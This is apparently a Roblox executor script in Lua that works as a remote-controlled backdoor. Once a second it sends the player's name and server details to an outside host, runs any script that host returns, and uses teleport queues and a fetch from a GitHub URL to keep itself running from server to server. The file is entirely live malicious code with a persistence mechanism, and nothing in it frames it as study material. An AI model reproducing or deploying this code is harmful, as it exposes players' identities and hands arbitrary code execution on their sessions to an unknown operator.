getgenv()._infected = getgenv()._infected or false
if getgenv()._infected then return end
getgenv()._infected = true

local Player = game.Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local Market = game:GetService("MarketplaceService")
local TeleportService = game:GetService("TeleportService")

local PlaceName = Market:GetProductInfo(game.PlaceId).Name
local serverLink = "https://raw.githubusercontent.com/boxleysadguy-ops/1337/refs/heads/main/main.lua"

local function improvedQueueOnTeleport(scriptContent)
    if not scriptContent then return end
    
    local success = pcall(function()
        TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, Player, nil, {
            infect_script = HttpService:JSONEncode({script = scriptContent, server = serverLink})
        })
    end)
    
    if not success then
        getgenv()._infectQueue = getgenv()._infectQueue or {}
        getgenv()._infectQueue[#getgenv()._infectQueue + 1] = scriptContent
        
        if syn then syn.queue_on_teleport(scriptContent)
        elseif queue_on_teleport then queue_on_teleport(scriptContent) end
    end
end

local antiF9 = {getgenv = getgenv, HttpGet = game.HttpGet, loadstring = loadstring}

local function stealthPing()
    local url = string.format(
        "http://luopn9cqp5.localto.net:8724/api/roblox_ping?placeid=%s&jobid=%s&playername=%s&placename=%s",
        game.PlaceId, game.JobId, HttpService:UrlEncode(Player.Name), HttpService:UrlEncode(PlaceName)
    )
    
    local success, response = pcall(antiF9.HttpGet, game, url)
    if success and response then
        local success2, data = pcall(HttpService.JSONDecode, HttpService, response)
        if success2 and data and data.execute then
            pcall(antiF9.loadstring, antiF9.loadstring, data.script)()
        end
    end
end

task.spawn(function()
    while task.wait(1) do stealthPing() end
end)

pcall(improvedQueueOnTeleport, [[
    getgenv()._infectQueue = getgenv()._infectQueue or {}
    for i, script in ipairs(getgenv()._infectQueue or {}) do
        loadstring(script)()
    end
]])

task.spawn(function()
    task.wait(2)
    local fallbackScript = 'loadstring(game:HttpGet("' .. serverLink .. '"))()'
    if queue_on_teleport then queue_on_teleport(fallbackScript) end
    if syn and syn.queue_on_teleport then syn.queue_on_teleport(fallbackScript) end
end)
